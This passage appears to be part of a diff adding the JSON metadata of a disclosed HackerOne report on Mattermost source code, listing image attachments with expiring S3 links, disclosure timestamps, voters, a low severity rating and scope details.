+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/w2lim3vpapw0m2a53w9hno7o741y?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2C5LCWPJ%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T202454Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDRfIf7p%2BzB84l2H%2BvTveuAllNHw3AQwpkferefiRqrKwIhALmpXT6p7j1ejFaXcC2L9M%2BeXd%2B5%2FMpLBbddxg1D%2FkX3KrsFCJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igyy4PU6LPl7zC%2BIYCMqjwUqyD3Gtagvz456amGT%2FdlSEs3qr5mIo7ufyYryGf0mR%2FZIYvvGBwa6I4Xv%2Bf2RExNRWL1PEBasTqXmjnSNE6Njx4NM6lQehtQhCkLNtVpvk9mxuDWol%2F%2Bd9X99J5HgfFTvTIK0sND5OdwK2Xii7TAU89d1wXsNIAeBxeEDxFXeNehRjTj8%2BP5qOgeKwO0ilW4tzaQrKo4vmNb0b0OXzJeHaOk5BfIaf8mekXGLvXUbQpZVDg%2BQV%2FG0BVNOXB2Ssg7CLKeJpVi3KXUk8I3p5NHbKNjSwtxsQwiAk77EzG%2BjFjrnJc%2FXosrh6bw%2BkYmNMWoG4e8aXiBxqswo85upElPRefvj0X4i5ksfIzFHxJ6mTE%2FfrMa8NLCdJiDHdhdLcayvQshQhnASmWjx9IXAly6esRF0lWV1WqMNbvioXbS1j6TaXFCzBhav8eXgJ1mjvZZOYw9twxC4gen6fVCjRVL27MiPT0CtoJo9TSej4gKA6SuQ1kxpquOTL6un7G1HXjRYlN%2BWfFtYGEMiAtOU3%2Br0VEJjcSEqfC2uBF2WtCciZ6h1V75%2FfOjEfPED%2BlUqBFDZBRUb6TDCvqxVh4RzQLWHlt5xKII%2B4YlutXBtzQ4m8JlEY7CxA8UlJfCyhcuQHF1kLjk4SWqV8JclDRdNXYAq42jih52Mbx1wBCDVEGwHnifQGBKoka6ArQtQ9l9lwAyNoKaBL9bmAfEXY2IY%2BSdIIJfMjrQHLjCwd6%2BHKEkS7cn7Go8VnsSSNZvaEyBQW%2BeXeD%2BXePUEd8eJeyVV14Q71Akogq%2BZW7QabybvPQdDL949VfHBi%2BhlrtSWq%2Fs5oUjgKUdiEM2eQ3dcnyouTyh5e%2B%2FHBxonwl9UBzmWdO9eMM%2FH4swGOrABdvcTMAy7%2FX5QI0FWQY77Fy6VatG6FqLZVm2BH780w05CdAQ6XHdzoNstEpm1e4DJqivADaRF%2F37TV9nnX1a0PlypiNAVMFuCoQIp3eBQGK8Y%2FYI%2FL%2BHWW25L%2FRU8Yqh9Rkx8cYD%2BTLMImqaG8uvgOuMBhubbhdxvh83NJbTZl2NnkQpNG7Jqy%2BMyvAUTiYA19p%2FT6VqQFadaDqM2Ox6RShImGGVR1NdtIkxK7l1Om8w%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=00aa1f11509f5838d5c4d28395acd262974a88084b5c8bf1fce089dc9ceec2e1",
+      "file_size": 104544,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 3339088,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/8zpqk9zvefittjc8h68lvrunezfu?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2C5LCWPJ%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T202454Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDRfIf7p%2BzB84l2H%2BvTveuAllNHw3AQwpkferefiRqrKwIhALmpXT6p7j1ejFaXcC2L9M%2BeXd%2B5%2FMpLBbddxg1D%2FkX3KrsFCJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igyy4PU6LPl7zC%2BIYCMqjwUqyD3Gtagvz456amGT%2FdlSEs3qr5mIo7ufyYryGf0mR%2FZIYvvGBwa6I4Xv%2Bf2RExNRWL1PEBasTqXmjnSNE6Njx4NM6lQehtQhCkLNtVpvk9mxuDWol%2F%2Bd9X99J5HgfFTvTIK0sND5OdwK2Xii7TAU89d1wXsNIAeBxeEDxFXeNehRjTj8%2BP5qOgeKwO0ilW4tzaQrKo4vmNb0b0OXzJeHaOk5BfIaf8mekXGLvXUbQpZVDg%2BQV%2FG0BVNOXB2Ssg7CLKeJpVi3KXUk8I3p5NHbKNjSwtxsQwiAk77EzG%2BjFjrnJc%2FXosrh6bw%2BkYmNMWoG4e8aXiBxqswo85upElPRefvj0X4i5ksfIzFHxJ6mTE%2FfrMa8NLCdJiDHdhdLcayvQshQhnASmWjx9IXAly6esRF0lWV1WqMNbvioXbS1j6TaXFCzBhav8eXgJ1mjvZZOYw9twxC4gen6fVCjRVL27MiPT0CtoJo9TSej4gKA6SuQ1kxpquOTL6un7G1HXjRYlN%2BWfFtYGEMiAtOU3%2Br0VEJjcSEqfC2uBF2WtCciZ6h1V75%2FfOjEfPED%2BlUqBFDZBRUb6TDCvqxVh4RzQLWHlt5xKII%2B4YlutXBtzQ4m8JlEY7CxA8UlJfCyhcuQHF1kLjk4SWqV8JclDRdNXYAq42jih52Mbx1wBCDVEGwHnifQGBKoka6ArQtQ9l9lwAyNoKaBL9bmAfEXY2IY%2BSdIIJfMjrQHLjCwd6%2BHKEkS7cn7Go8VnsSSNZvaEyBQW%2BeXeD%2BXePUEd8eJeyVV14Q71Akogq%2BZW7QabybvPQdDL949VfHBi%2BhlrtSWq%2Fs5oUjgKUdiEM2eQ3dcnyouTyh5e%2B%2FHBxonwl9UBzmWdO9eMM%2FH4swGOrABdvcTMAy7%2FX5QI0FWQY77Fy6VatG6FqLZVm2BH780w05CdAQ6XHdzoNstEpm1e4DJqivADaRF%2F37TV9nnX1a0PlypiNAVMFuCoQIp3eBQGK8Y%2FYI%2FL%2BHWW25L%2FRU8Yqh9Rkx8cYD%2BTLMImqaG8uvgOuMBhubbhdxvh83NJbTZl2NnkQpNG7Jqy%2BMyvAUTiYA19p%2FT6VqQFadaDqM2Ox6RShImGGVR1NdtIkxK7l1Om8w%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=cf23fe08ad909a004e174339bed3cd6f60715b68f1244692060b3d6914d2f523",
+      "file_size": 112414,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 3339089,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/cbswr0mkiyvhshg6tv8sxswgxwrz?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2C5LCWPJ%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T202454Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDRfIf7p%2BzB84l2H%2BvTveuAllNHw3AQwpkferefiRqrKwIhALmpXT6p7j1ejFaXcC2L9M%2BeXd%2B5%2FMpLBbddxg1D%2FkX3KrsFCJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igyy4PU6LPl7zC%2BIYCMqjwUqyD3Gtagvz456amGT%2FdlSEs3qr5mIo7ufyYryGf0mR%2FZIYvvGBwa6I4Xv%2Bf2RExNRWL1PEBasTqXmjnSNE6Njx4NM6lQehtQhCkLNtVpvk9mxuDWol%2F%2Bd9X99J5HgfFTvTIK0sND5OdwK2Xii7TAU89d1wXsNIAeBxeEDxFXeNehRjTj8%2BP5qOgeKwO0ilW4tzaQrKo4vmNb0b0OXzJeHaOk5BfIaf8mekXGLvXUbQpZVDg%2BQV%2FG0BVNOXB2Ssg7CLKeJpVi3KXUk8I3p5NHbKNjSwtxsQwiAk77EzG%2BjFjrnJc%2FXosrh6bw%2BkYmNMWoG4e8aXiBxqswo85upElPRefvj0X4i5ksfIzFHxJ6mTE%2FfrMa8NLCdJiDHdhdLcayvQshQhnASmWjx9IXAly6esRF0lWV1WqMNbvioXbS1j6TaXFCzBhav8eXgJ1mjvZZOYw9twxC4gen6fVCjRVL27MiPT0CtoJo9TSej4gKA6SuQ1kxpquOTL6un7G1HXjRYlN%2BWfFtYGEMiAtOU3%2Br0VEJjcSEqfC2uBF2WtCciZ6h1V75%2FfOjEfPED%2BlUqBFDZBRUb6TDCvqxVh4RzQLWHlt5xKII%2B4YlutXBtzQ4m8JlEY7CxA8UlJfCyhcuQHF1kLjk4SWqV8JclDRdNXYAq42jih52Mbx1wBCDVEGwHnifQGBKoka6ArQtQ9l9lwAyNoKaBL9bmAfEXY2IY%2BSdIIJfMjrQHLjCwd6%2BHKEkS7cn7Go8VnsSSNZvaEyBQW%2BeXeD%2BXePUEd8eJeyVV14Q71Akogq%2BZW7QabybvPQdDL949VfHBi%2BhlrtSWq%2Fs5oUjgKUdiEM2eQ3dcnyouTyh5e%2B%2FHBxonwl9UBzmWdO9eMM%2FH4swGOrABdvcTMAy7%2FX5QI0FWQY77Fy6VatG6FqLZVm2BH780w05CdAQ6XHdzoNstEpm1e4DJqivADaRF%2F37TV9nnX1a0PlypiNAVMFuCoQIp3eBQGK8Y%2FYI%2FL%2BHWW25L%2FRU8Yqh9Rkx8cYD%2BTLMImqaG8uvgOuMBhubbhdxvh83NJbTZl2NnkQpNG7Jqy%2BMyvAUTiYA19p%2FT6VqQFadaDqM2Ox6RShImGGVR1NdtIkxK7l1Om8w%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=650318f12c37420df2559e4307fa6710c012270f9b1061b2a9578b748eacdb4a",
+      "file_size": 96216,
+      "type": "image/png",
+      "moderated": false
+    }
+  ],
+  "allow_singular_disclosure_at": "2024-10-27T07:43:31.839Z",
+  "allow_singular_disclosure_after": -41604083.09761616,
+  "singular_disclosure_allowed": true,
+  "vote_count": 39,
+  "voters": [
+    "k0ns0l",
+    "torious",
+    "zy9ard3",
+    "anonxr",
+    "d3f7ult",
+    "thalaivar304",
+    "jmo740",
+    "2026",
+    "hundredpercent",
+    "0xleonidas",
+    "and 29 more..."
+  ],
+  "severity": {
+    "rating": "low",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 181349,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "Mattermost Source Code",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
